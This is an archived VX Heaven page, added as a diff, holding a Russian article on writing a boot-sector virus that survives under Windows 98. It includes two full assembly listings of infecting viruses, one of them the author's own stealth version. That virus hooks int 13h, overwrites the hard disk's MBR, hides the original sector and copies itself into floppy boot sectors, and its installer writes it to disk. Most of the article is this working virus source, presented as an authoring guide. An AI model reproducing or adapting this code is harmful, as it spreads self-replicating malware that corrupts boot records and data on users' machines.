@@ -1,0 +1,679 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Chingachguk 'Бут-вирус под виндовс98: старые звери в новом лесу' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Chingachguk"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Chingachguk,Бут-вирус под виндовс98: старые звери в новом лесу, push, error, pushf, сектор, обработчик, read, нулевой, nobootrec, загрузки, real, загрузке, boot, windows, момент, text"/>
+<meta name="Description" content="[...] я задался целью написать работоспособный под Windows вирус, который: перехватывает прерывание int 13h при загрузке и использует только его, работает во всех задачах (таких, как Word), не использует особенностей OS (в данном случае ? перехват чисто dos-ого прерывания int 21h, а является потенциально опасным для любых OS, работающих по тем или иным причинам с винчестером через BIOS)."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"dc65c7c3b5612b4fee339a4c43e54ce0ea8c2f17-1498757972-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vci00.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Бут-вирус под виндовс98: старые звери в новом лесу</h1><p><a href="/lib/?lang=ru&amp;author=Chingachguk"> Chingachguk</a><br/> <em>http://wasm.ru/</em><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vci00.html';</script>[<a style="" href="/lib/?lang=RU&amp;index=WI#vci00">Вернуться к списку</a>] [<a href="/lib/vci00.html#disqus_thread">Комментарии</a>]<br/> 
+<ul>
+<li><a href="#p1">Предистория</a></li>
+<li><a href="#p2">Проблема</a></li>
+<li><a href="#p3">Решение И. Коваля</a></li>
+<li><a href="#p4">Дальнейшие изыскания</a></li>
+<li><a href="#p5">Почему это вообще работает?</a></li>
+<li><a href="#p6">Благодарности</a></li>
+</ul>
+<h2><a name="p1">Предистория</a></h2>
+<p>B книге <em>Игоря Коваля "Как написать компьтерный вирус" (2000 год, издательство "Символ-Плюс")</em> рассматривается возможность реализации загрузочного вируса, способного функционировать под Windows. Под возможностью функционирования понимается способность программы поражать стандартные мишени - бут-сектора дискет. </p>
+<p>Для начала приведем стандартный алгоритм простого нефайлового вируса ("form", "stone" , проч.). Перехватив тем или иным способом процесс загрузки с винчестера, вирус, если он собирается быть активным (резидентным) в течении всего сеанса работы компьютера, использует перехват прерывания(ий) с целью следить за обращениями пользовательских программ к дисководу(ам) и, выбрав момент, перенести свое тело на дискету в ее BOOT-сектор. </p>
+<p>Самое простое, что можно сделать (и было сделано много раз) в этом направлении - это перехватить сервис BIOS прерывание int 13h, предназначенное для работы с жесткими дисками и дискетами. Такой выбор объясняется следующими причинами:</p>
+<ul>
+<li> Вирус получает управление перед/после выполнения программ MBR или BOOT активного раздела жесткого диска, когда доступными для перехвата являются только сервисы BIOS - операционная система еще не активизировала свои прерывания;</li>
+<li> Большинство пользовательских программ при работе с дискетами косвенно через сервисы OS вызывают int 13h и несложные проверки на номер драйва, сектора и дорожки позволяют легко идентифицировать момент заражения дискеты.</li>
+</ul>
+<p>Таким образом, все, что необходимо для функционирования такого класса программ - это OS, использующая для работы с накопителями ТОЛЬКО сервисы, предоставляемые BIOS.</p>
+<h2><a name="p2">Проблема</a></h2>
+<p>Однако что же будет в "плохом" для нас случае, когда противная операционная система по тем или иным причинам не желает использовать стандартные средства для доступа к драйвам, а норовит использовать свои драйвера?</p>
+<p>Игорь Коваль в своей книге исследовал работу классического резидентного (на int 13h) вируса под Windows, и обнаружил, что после загрузки системы вирус перестает быть активным. Точнее говоря, он становится псевдоактивным - с винчестером OS продолжает работать через него, но вот вызовы программ (автор уделил особое внимание дос-окошкам - Norton Commander) для работы с дисководами до него не доходят. Следовательно, вирус не может активизироваться для заражения дискеты, поскольку он отлавливает момент обращения именно к дисководам (скажем, сравнение номера драйва в регистре dl &lt;=1). Оказалось, что Windows, по словам автора, использует свой драйвер для работы с дискетами, а вот для жесткого диска "предпочитает" работу стандартными средствами... (Далее будет показано, что это не совсем так - - поведение OS более нешаблонно при выборе стратегии работы с накопителями).</p>
+<h2><a name="p3">Решение И. Коваля</a></h2>
+<pre class="source">
+prg segment
+assume cs:prg,ds:prg,es:prg,ss:prg
+	org 100h
+my_prg:	jmp installer		;Переход на секцию 
+				;инсталляции
+	dw 7bfeh        	;Установка собственного стека
+        push cs
+        pop ds
+sub word ptr ds:[0413h],2 	;Отрежем у DOS
+        mov ax,ds:[0413h] 	;2 Кбайта памяти
+        mov cl,6        	;и вычислим
+        sal ax,cl       	;сегментный адрес,
+                        	;по которому находится
+                        	;полученный блок
+        mov es,ax       	;Поместим адрес в ES
+        xor si,si       	;И скопируем код вируса
+        mov cx,prg_lenght 	;длиной &lt;prg_lenght>
+prg_copy:
+        db 8ah          	;в память по адресу
+        db 9ch          	;ES:0000h
+additor db 00h
+        db 7ch          	;Сам код при загрузке
+        mov byte ptr es:[si],bl
+        inc si          	;помещается BIOS
+        loop prg_copy   	;по адресу 0000:7c00h
+        push ax         	;Запишем в стек
+        mov ax,to_read_boot 	;адрес ES:to_read_boot
+        push ax         	;и осуществим переход
+        db 0cbh         	;на этот адрес
+to_read_boot equ $-my_prg
+read_boot:
+        push cs         	;DS=CS
+        pop ds
+        xor si,si       	;SI=0
+        mov es,si       	;ES=SI
+                        	;Получим вектор 16h
+        mov bx,word ptr es:[58h];и сохраним его
+        mov word ptr old_16h - 100h,bx
+        mov bx,word ptr es:[5ah]
+        mov word ptr old_16h_2 - 100h,bx
+        ; Установим вектор int 16h на вирусный обработчик
+        mov word ptr es:[58h],to_new_16h
+        mov word ptr es:[5ah],cs
+        ; Считаем настоящий загрузочный сектор
+        mov dx,num_head - 100h
+        mov cx,cyl_sect - 100h
+        mov bx,7c00h    	;В память по адресу
+        mov ax,0201h    	;0000:7c00h
+        int 13h
+        push cs         	;ES=CS
+        pop es
+        mov dl,80h      	;Считаем MBR винчестера
+        call read_mbr   	;по адресу CS:0400h
+        			; причем загрузка сейчас
+        jc to_quit      	;может производиться
+                        	;и с дискеты !
+cmp byte ptr ds:[400h],0eh 	; MBR уже заражена ?
+        je to_quit      	;Да - на выход,
+                        	;иначе продолжим:
+        mov dx,0080h    	;Нулевая головка
+                        	;первого сектора жесткого диска
+        mov cx,000ch    	;Сектор 12, дорожка 0
+        ; сохраним эти параметры, кроме того, перепишем
+        call write_mbr_last
+        ; настоящую mbr в сектор 12 нулевой дорожки
+        ; на нулевой стороне HDD 1
+        jc to_quit
+        xor si,si       	; Сформируем код
+        mov additor - 100h,00h	; для записи его на место исходной MBR
+        mov cx,prg_lenght
+copy_vir_mbr:
+        mov al,byte ptr ds:[si]
+        mov byte ptr ds:[si+400h],al
+        inc si
+        loop copy_vir_mbr
+        mov dx,0080h    	;Запишем этот код
+        call write_mbr 		;в первый сектор
+                        	;нулевой дорожки
+                        	;нулевой стороны
+                        	;винчестера
+to_quit:db 0eah         	;Отдадим управление
+        dw 7c00h        	;настоящей загрузочной
+        dw 0000h        	;записи (MBR)
+;-------------------------------------------
+; Здесь начинается настоящий вирусны обработчик Int 16h.
+; Наш вирус использует его, чтобы следить за
+; состоянием вирусного обработчика Int 21h
+; и при необходимости его перехватывать
+
+        to_new_16h equ $-my_prg
+
+new_16h:push ax        		;Сохраним регистры в стеке
+        push bx
+        push dx
+        push ds
+        push es
+        pushf
+                       		;Вызовем вирусный
+        mov ax,0babch  		; обработчик Int 21h
+        int 21h        		;собственной функцией
+        cmp al,98h     		;AX=0babch
+                       		;Если обработчик активен,
+        je rrr_rrr     		;мы должны
+        			; получить AL = 98h, иначе Int 21h следует
+        			; перехватить, чем мы и займемся:
+        push cs        		;DS = CS
+        pop ds
+        cli            		;Запретить прерывания
+        mov ax,3521h   		;Получим и сохраним
+        int 21h        		;Вектор Int 21h
+        mov old_21h - 100h,bx
+        mov old_21h_2 - 100h,es
+        mov ax,2521h   		;А теперь переставим
+        mov dx,to_new_21h 	;этот вектор на вирусный
+        int 21h        		;обработчик
+        sti            		;Разрешить прерывания
+rrr_rrr:popf           		;Восстановим регистры из стека
+        pop es
+        pop ds
+        pop dx
+        pop bx
+        pop ax
+        db 0eah        		;И перейдем на
+old_16h dw 0           		;системный обработчик
+old_16h_2 dw 0         		;Int 16h
+;---------------------------------------------
+; Здесь начинается вирусны обработчик Int 21h.
+; Он отслеживает смену оператором текущего диска.
+; Если текущим становиться диск A или B,
+; обработчик заражает этот диск.
+to_new_21h equ $-my_prg
+new_21h:pushf          		;Этот участок обработчика Int 21h
+        cmp ax,0babch  		;отвечает
+        jnz else_func  		;обработчику Int 16h
+        mov al,98h     		;значением AL = 98h,
+        popf           		;что служит признаком
+        iret           		;активности обработчика Int 21h
+else_func:
+        popf           		;Сохраним регистры в стеке
+        push ax
+        push bx
+        push cx
+        push dx
+        push di
+        push ds
+        push es
+        pushf
+        cmp ah,0eh     		;Смена текущего диска ?
+        jnz to_jump    		;Нет - на выход
+        cmp dl,1       		;Да - текущим хотят
+			        ; сделать дисковод A или B ?
+        ja to_jump  		;Нет - на выход
+        push cs
+        pop es
+        push cs        		;DS = CS
+        pop ds
+        mov cx,3       		;Попробуем прочесть
+next_read:
+        push cx        		;BOOT-сектор дискеты
+        call read_mbr  		;На это даем три
+        pop cx         		;попытки (например,
+        jnc inf_check  		;если двигатель дисковода
+			        ; не успел разогнаться до рабочей скорости,
+			        ; то BIOS вернет ошибку - дискета сменена !)
+        xor ah,ah      		;При ошибке сбросим
+        int 13h        		;текущий дисковод
+        jc to_jump     		;и повторим
+        loop next_read 		;чтение
+to_jump:jmp restore_regs
+        			;BOOT заражен ?
+inf_check:
+        cmp byte ptr ds:[455h],0eh
+        je to_jump     		;Да !
+cmp word ptr ds:[40bh],200h 	;512 байт в секторе ?
+        jne restore_regs 	;Нет - на выход
+        mov ch,79h     		;Определим
+        mov dh,byte ptr ds:[415h]
+        cmp dh,0f0h    		;параметры
+        je real_80     		;дискеты
+        cmp dh,0f9h    		;по ее Media
+        je real_80     		;Descryptor
+        cmp dh,0fdh
+        jne to_jump
+        mov ch,39
+real_80:mov dh,01h
+        mov cl,byte ptr ds:[418h]
+			        ; Перепишем настоящий BOOT в последний
+			        ; сектор последней дорожки на последней стороне
+        call write_mbr_last
+        jc cs:to_jump
+			        ;Сформируем код
+        mov additor - 100h,055h
+        xor di,di      		;Котрый нужно
+        mov cx,prg_lenght 	; записать на дискету
+copy_vir: mov al,byte ptr ds:[di]
+        mov byte ptr ds:[di+455h],al
+        inc di       		;вместо исходной
+        loop cs:copy_vir 	; BOOT-записи
+        mov word ptr ds:[400h],053ebh
+        xor dh,dh    		;И запишем его в первый
+        call write_mbr 		;сектор нулевой дорожки
+                     		;нулевой стороны дискеты
+restore_regs:        		;Восстановим из стека регистры
+        popf
+        pop es
+        pop ds
+        pop di
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+        db 0eah      		;И перейдем на
+old_21h dw 0         		;системный обработчик
+old_21h_2 dw 0       		;Int 21h
+read_mbr proc
+        xor dh,dh    		;Процедура читает
+        mov ax,0201h 		;первый сектор
+        mov bx,400h  		;нулевой дорожки
+        mov cx,01h   		;нулевой строны
+        int 13h      		;указанного накопителя
+        ret
+read_mbr endp
+write_mbr proc
+        mov ax,0301h 		;Процедура помещает
+        mov cx,01h   		;вирусны код в
+        int 13h      		;BOOT-сектор дискеты
+        ret          		;или записывает его
+write_mbr endp       		;вместо MBR винчестера
+write_mbr_last proc  		;Процедура переписывает
+                     		;исходную BOOT-запись
+                     		;или MBR в заданный сектор
+        push dx      		;Если заражается
+        cmp dl,01h   		;диск в дисководе B,
+        jne cs:not_correct 	;следует обнулить
+        xor dl,dl    		;номер накопителя
+not_correct:         		;в ячейке &lt;num_head>
+        mov num_head-100h,dx
+        pop dx       		;иначе машина не будет загружаться
+        mov cyl_sect - 100h,cx
+        mov ax,0301h 		;с такого диска
+        int 13h      		;Остальное,
+        ret          		;кажется, ясно
+write_mbr_last endp
+vir_name db '?'      		;Придумайте сами, но не более 9 байт !
+num_head dw 0        		;Здесь вирус хранит
+cyl_sect dw 0        		;номер головки, дорожки
+                     		;и сектора, в которых записана
+                     		;настоящая загрузочная запись
+                     		;зараженного диска
+prg_lenght equ $-my_prg
+; Здесь начинается секция инсталляции вируса
+installer:
+        lea si,my_prg 		;Подменим команду
+        mov byte ptr [si],00eh
+mov byte ptr [si+1],017h 	;на первые три байта
+mov byte ptr [si+2],0bch 	;кода вируса
+			        ; Начало вируса будет иметь вид:
+			        ; push CS
+			        ; pop SS
+			        ; mov SP,7BFEh
+        mov ax,0201h  		;Теперь попробуем
+        mov cx,01h    		;прочесть BOOT-сектор
+        xor dx,dx     		;дискеты
+        lea bx,buffer
+        int 13h
+        jc error
+        push es       		;Получим параметры
+        mov ah,08h    		;дискеты
+        xor dl,dl
+        int 13h
+        jnc all_good
+        cmp ah,01h
+        jne error
+        mov dh,01h
+        mov ch,27h
+        mov cl,byte ptr buffer[18h]
+all_good: xor dl,dl
+        mov num_head,dx
+        mov cyl_sect,cx
+        pop es
+        mov ax,0301h  		;Перепишем настоящий
+        lea bx,buffer 		;BOOT в пооследний
+                      		;сектор последней
+        int 13h       		;дорожки на
+        jc error      		;последней стороне
+        mov additor,055h 	;Сформируем код
+        lea si,buffer+55h 	;котрый нужно
+        lea di,my_prg 		;записать на дискету
+        mov cx,prg_lenght 	; вместо исходной
+copy_boot:            		;BOOT-записи
+        mov al,byte ptr [di]
+        mov byte ptr [si],al
+        inc si
+        inc di
+        loop copy_boot
+        mov word ptr buffer[0],053ebh
+        mov ax,0301h  		;И запишем его
+        mov cx,01h    		;в первый сектор
+        mov dx,0      		;нулевой дорожки
+        lea bx,buffer 		;нулевой стороны
+        int 13h       		;дискеты
+        jnc prg_end
+error:  mov ah,09h    		;Если была ошибка
+        lea dx,err_mes 		;выведем
+        int 21h       		;сообщение о ней
+prg_end:mov ax,4c00h  		;Завершаем запускающую
+        int 21h       		;программу
+err_mes db 'Error$'   		;Сообщение
+buffer db 512 dup(0)     	;В этот буфер считывается
+                      		;BOOT-сектор заражаемой дискеты
+prg ends              		;Стандартное окончание
+end my_prg            		;ASM-программы
+</pre>
+<p>Столкнувшись с вышеприведенной проблемой, И. Коваль пошел по пути использования перехвата сервиса DOS для работы с дисками, а именно - int 21h, функции 0eh (смена текущего диска). Алгоритм триггера активизации вируса в этом случае даже проще, чем в случае int 13h - достаточно следить за попытками выбрать через эту функцию дисковод.</p>
+<p>Осталось решить, как перейти от момента загрузки компьютера к перехваченному прерыванию int 21h.</p>
+<p>Общий принцип перехода заключался в активном ожидании загрузки DOS и перехвате int 21h после его появления.</p>
+<p>Автор показал, что ожидающая программа не может использовать очевидные на первый взгляд прерывания int 1ch, int 08h и int09h. Дело в том, что Windows перестает использовать стандартные биос-обработчики этих прерываний в своей работе и восстанавливает вектор int 21h. Решением оказалось использование вектора int 16h. Обработчик этого вектора "остается в живых" после загрузки, и, более того, вызывется во всех без исключения программах Windows - даже таких, как Word.</p>
+<p>Схематично работу такого вируса можно представить следующим образом:</p>
+<ol>
+<li>При первом получении управления в процессе загрузки mbr вирус перехватывает int 16h;</li>
+<li>Обработчик прерывания int 16h следит за вектором int 21h, вызывая его недокументированной функцией AX=0babch - контроль на перехват;</li>
+<li>Если вектор int 21h не отвечает стандартным образом, то считается, что необходимо выполнить перехват int 21h;</li>
+<li>Обработчик int 21h следит за сменой диска, контролируя функцию 0eh.</li>
+</ol>
+<p>Автор утверждает, что такой вирус нормально работает в DOS окошках и осталяет "на будущее" реализацию работоспособной программы во всех приложениях Windows.</p>
+<h2><a name="p4">Дальнейшие изыскания</a></h2>
+<pre class="source">
+.286                            ; Virus Size~=350 bytes
+VirLenght equ offset @@EndOfVir - offset begin
+BuffOfs   equ 512               ; Block for MBR
+text segment byte public
+	assume cs:text,ds:text
+	org   100h
+begin:  jmp   @@Install         ; Will be push cs
+        dw    07bfeh            ; ... pop ss, mov sp,7bfeh - 1+1+3 = 5 bytes
+        call  GetOfs            ; Get Current Offset in si
+GetOfs: pop   si                ; si = offset 'pop si' - 1 byte
+        sub   si,3+2+3          ; si = "offset" begin
+        push  cs                ; 1 byte
+        pop   ds                ; ds = 0000h
+        cld                     ; Move Strings Forward
+        dec   word ptr ds:[0413h]
+        mov   ax,word ptr ds:[0413h]
+        shl   ax,6              ; Decrease DOS memory by 1 Kbyte(1024 Bytes)
+        mov   es,ax             ; es = segment of "hidden" memory
+        mov   cx,VirLenght      ; Total Viral Code in bytes
+        xor   di,di             ; Move to es:0000h
+        push  es                ; All ItSelf Code
+        push  offset @@StartVir - 100h
+        rep   movsb             ; 2 bytes
+        retf                    ; go to es:@@StartVir - 1 byte
+@@StartVir:
+        push  ds                ; Load Nature MBR
+        pop   es                ; es = 0000h
+        mov   ax,0201h          ; Sectors = 1
+        mov   bx,07c00h         ; Standart Place for BOOT/MBR
+        mov   cx,cs:[di-3]      ; Road, Sect
+        mov   dx,cs:[di-5]      ; Head, Diskovod
+        push  ax                ; Save ax
+        int   13h               ; write to 0000:07c00
+        pop   ax                ; ax = 0201h
+        push  es                ; Be ready to return
+        push  bx                ; Push far Ret Address 0000:7c00
+; Infect Hard Drive
+        mov   si,0040h*16+00b6h ; Virus Warning on Boot
+        push  word ptr ds:[si]
+        and   byte ptr ds:[si],255-128
+        push  cs                ; ds = to new Data Allocation
+        pop   ds
+        push  cs
+        pop   es                ; es=cs
+        mov   cx,0001h          ; Road=0, Sect=1
+        mov   dx,0080h          ; Head,Diskovod=80h
+        mov   bx,BuffOfs
+        int   13h               ; es:[bx] - point to Buffer
+        jc    @@ErrMBR          ; Disk Not Reading
+        cmp   byte ptr [bx],0eh ; Already Infected ?
+        jz    @@ErrMBR          ; Yes !
+        mov   cl,0ch            ; Use 12 Sector
+        mov   ax,0301h          ; Write Function
+        int   13h
+        jc    @@ErrMBR          ; Disk Not Reading
+        mov   di,bx             ; Our Code
+        call  @@CopyBoot        ; Viral Code to ... Replace to old MBR
+        int   13h               ; ax=0301h, cx=0001h
+@@ErrMBR:
+        push  ss
+        pop   es                ; es=0000h
+        pop   word ptr es:[si]  ; Virus Warning on Boot
+        mov   byte ptr ds:[si-1],0
+        mov   di,13h*4          ; Hook int 13h
+        mov   ax,offset @@New13Handler - 100h
+        xchg  ax,word ptr es:[di]
+        mov   word ptr Old13h-100h,ax
+        mov   ax,cs
+        xchg  ax,word ptr es:[di+2]
+        mov   word ptr Old13h-100h+2,ax
+; To Nature Boot/MBR Record
+        retf
+@@New13Handler:                 ; New int 13h handler
+        push  si
+        mov   si,offset Old13h-100h
+        push  ds
+        push  cs
+        pop   ds
+        mov   ds:[si+8],ah      ; Save ah
+        cmp   ah,02h
+        jz    @@Stells
+        cmp   ah,03h
+        jnz   @@SkipStells
+@@Stells:
+        cmp   cx,0001h
+        jnz   @@SkipStells
+        test  dh,dh
+        jnz   @@SkipStells
+        cmp   dl,[si+4]         ; Read Start Device ?
+        jnz   @@SkipStells
+        push  cx
+        push  dx
+        mov   dx,ds:[si+4]
+        mov   cx,ds:[si+6]
+        pushf
+        call  dword ptr ds:[si] ; Execute It !
+        pop   dx
+        pop   cx
+        jmp   short @@AfterStells
+@@SkipStells:
+        pushf
+        call  dword ptr ds:[si] ; Execute It !
+@@AfterStells:
+        jc    @@DiskError
+        pushf
+        pusha
+        push  es                ; Check for BOOT Signature...
+        cmp   word ptr es:[bx+01feh],0aa55h
+        jnz   @@NoBootRec
+        cmp   byte ptr es:[bx],0ebh
+        jnz   @@NoBootRec       ; Real BOOT Record ?!
+        mov   ah,02h            ; Try to Infect !!!
+        mov   ds:[si+8],ah      ; It works under Windows too )))
+        mov   cx,0001
+        xor   dx,dx
+@@NoBootRec:
+        test  dl,dl             ; Drive A ?
+        jnz   @@Usal13h
+        mov   ax,0201h          ; ax=0201h, 1 Sector
+        cmp   ds:[si+8],ah      ; It was reading ?
+        jnz   @@Usal13h
+        xor   dh,dh             ; Head=0
+        dec   cx                ; Road=0, Sec=1 (cx=01h) ?
+        jnz   @@Usal13h
+        inc   cx                ; cx=0001h
+        mov   bx,BuffOfs        ; Reading That We Need !
+        push  ds
+        pop   es
+        pushf
+        call  dword ptr ds:[si] ; Execute It !
+        jc    @@Usal13h         ; Error !
+        lea   di,[bx+0055h]
+        cmp   byte ptr [di],0eh ; Already Infected ?
+        jz    @@Usal13h         ; Yes !
+        mov   ch,79             ; Default Road
+        mov   al,[bx+15h]
+        cmp   al,0f0h
+        jz    @@Real80
+        cmp   al,0f9h
+        jz    @@Real80
+        cmp   al,0fh
+        jnz   @@Usal13h
+        mov   ch,39
+@@Real80:
+        inc   dh                ; dx=0100h
+        mov   cl,[bx+18h]       ; Max Sector
+        mov   ax,0301h          ; Write function
+        pushf
+        call  dword ptr ds:[si] ; Execute It !
+        jc    @@Usal13h
+        mov   word ptr [bx],053ebh
+        call  @@CopyBoot
+        xor   dx,dx             ; cx=0001h
+        pushf
+        call  dword ptr ds:[si] ; Execute It !
+@@Usal13h:
+        pop   es
+        popa
+        popf
+@@DiskError:
+        pop   ds
+        pop   si
+        retf  2
+@@CopyBoot:                     ; Move all Viral Code to es:[di]
+        pusha                   ; For disk int 13h operations
+        cld
+        mov   cx,VirLenght
+        xor   si,si
+        rep   movsb
+        popa                    ; ... and put onto this new Road..Disk
+        mov   CylSec[di-100h],cx  ; Road, Sect
+        mov   NumHead[di-100h],dx ; Head, Diskovod
+        mov   ax,0301h          ; After return we'll use
+        mov   cx,0001h          ; these values
+        ret
+Old13h:    dw    ?              ; [si]
+           dw    ?              ; [si+2]
+NumHead    dw    ?              ; [si+4]
+CylSec     dw    ?              ; [si+6]
+Save_ah    db    ?              ; [si+8]
+@@EndOfVir:
+@@Install:
+        mov   ax,0201h          ; Sectors = 1
+        mov   cx,01h            ; Road =0, Sect = 1
+        xor   dx,dx             ; Head = 0, Diskovod = 0
+        mov   bx,offset DiskBuffer
+        int   13h               ; es:[bx] - point to Buffer
+        jc    @@Error           ; Disk Not Reading
+        push  es
+        push  bx
+        mov   ah,08h
+        xor   dl,dl
+        int   13h
+        pop   bx
+        pop   es
+        jc    @@Error
+        xor   dl,dl
+        mov   NumHead,dx
+        mov   CylSec,cx
+        mov   ax,0301h
+        int   13h
+        jc    @@Error
+        cld
+        mov   si,offset begin
+        mov   word ptr [si],0170eh
+        mov   byte ptr [si+2],0bch
+        mov   word ptr DiskBuffer,053ebh
+        mov   di,offset DiskBuffer + 0055h
+        mov   cx,VirLenght
+        rep   movsb
+        mov   ax,0301h
+        mov   cx,01h
+        xor   dx,dx
+        int   13h
+        jc    @@Error
+@@Exit:
+	mov   ax,4C00h
+	int   21H		; BACK TO DOS ! - Only Once !
+@@Error:
+        mov   dx,offset ErrMess
+        mov   ah,09h
+        int   21h
+        jmp   short @@Exit
+Done:
+ErrMess    db 'Error !','$'
+DiskBuffer db 512 dup(?)
+Text Ends
+	end begin
+</pre>
+<p>Пройдя некоторое время по этому пути, я проверил утверждения насчет "живучести" перехватчиков векторов int 16h и int 13h под Windows. Оказалось - все так и есть, правда, остается непонятным детальный механизм перехвата int 21h с вектора int 16h. Вектор int 16h вызывается не при нажатии любой клавиши, а только специальных (типа shift). Видимо, это делается для того, чтобы биос мог отследить состояние своих флажков...</p>
+<p>Однако далее я задался целью написать работоспособный под Windows вирус, который:</p>
+<ol>
+<li>Перехватывает прерывание int 13h при загрузке и использует только его;</li>
+<li>Работает во всех задачах (таких, как Word);</li>
+<li>Не использует особенностей OS (в данном случае - перехват чисто dos-ого прерывания int 21h, а является потенциально опасным для любых OS, работающих по тем или иным причинам с винчестером через BIOS).</li>
+</ol>
+<p>Проблема с активностью вполне решается таким перехватом. Как уже было сказано, перехватчик int 13h вызывается при ВСЕХ операциях с винчестером. Остается поймать момент обращения к дисководу. На бессмысленность переодических запросов (а не засунули в дисковод ли чего-нибудь ?) указал сам И. Коваль.</p>
+<p>Рассмотри процесс форматирования дискеты (неважно, из виндового приложения или из NC). OS должна, нет, она просто обязана записать на него свой новенький бут-сектор. А где она его может взять ? Конечно, с винта ! А кто винт контролирует ?! Мы ! Так чего же мы ждем:</p>
+<p>(Скажем, только что с винта был прочитан сектор, и он сейчас в es:[bx])</p>
+<pre class="source">
+	push es                		; Check for BOOT Signature...
+	cmp	 word ptr es:[bx+01feh],0aa55h
+	jnz	 @@NoBootRec
+	cmp	 byte ptr es:[bx],0ebh
+	jnz	 @@NoBootRec       	; Real BOOT Record ?!
+	mov	 ah,02h            	; Try to Infect !!!
+	mov	 ds:[si+8],ah      	; It works under Windows too )))
+</pre>
+<p>Причем, проверка на наличие команды jmp short (cmp byte ptr es:[bx],0ebh) вроде и необязательна... Это я проверил, когда поставил типа beep внутрь этих проверок, и следил когда он раздается при загрузке винды, чтении дискеты ...</p>
+<p>Некоторой неожиданностью для меня оказалось то, что такой алгоритм работает не только в случае форматирования ! А также и в случае невинного обращения к дисководу... Зачем Windows(или еще кто) читает в этот момент с винчестера загрузочный бут-сектор - для меня пока загадка. Может, параметры какие выверяет ?..</p>
+<h2><a name="p5">Почему это вообще работает?</a></h2>
+<p>Почему Windows вызывает прехватчик int 13h, инсталлировавшийся при загрузке (из MBR) во всех своих задачах ?</p>
+<p>Как оказалось, вопрос, представлявшийся мне тривиальным на этапе разработки виря и прочтении книги И. Коваля, имеет довольно сложный ответ. Оказывается, что (нижеизложенное выяснилось при стихийно возникшей дисскуссии на bugtraq-forum, участвовали люди с никами :-) и z0, было это примерно в середине октября 2001 года):</p>
+<ul>
+<li>При загрузке винда определяет, где находится обработчик int 13h. Если он не в биос-е, то она считает, что устройство - нестандартное, и работает с винчестером через него. Причем неважно, является ли вирус стеллсом или нет (будет ли разница в чтении загрузочного сектора через родной драйвер виндов и int 13h).</li>
+<li>Так работает только 98-ые винды, винды же 95 не вызывают такой перехватчик (!)</li>
+<li>Если же перехватчик указать в autoexec.bat, то обе винды (и 95 и 98) однозначно работают через него с диском.</li>
+</ul>
+<h2><a name="p6">Благодарности</a></h2>
+<ul>
+<li>Игоря Коваля за замечательную книгу, позволившую мне глубоко понять механизм работы Windows;</li>
+<li>всех участников форума <strong>bugtruq</strong> за их разъяснения :)</li>
+</ul>
+<pre>			[C] Chingachguk / HI-TECH</pre>
+[<a style="" href="/lib/?lang=RU&amp;index=WI#vci00">Вернуться к списку</a>] [<a href="/lib/vci00.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
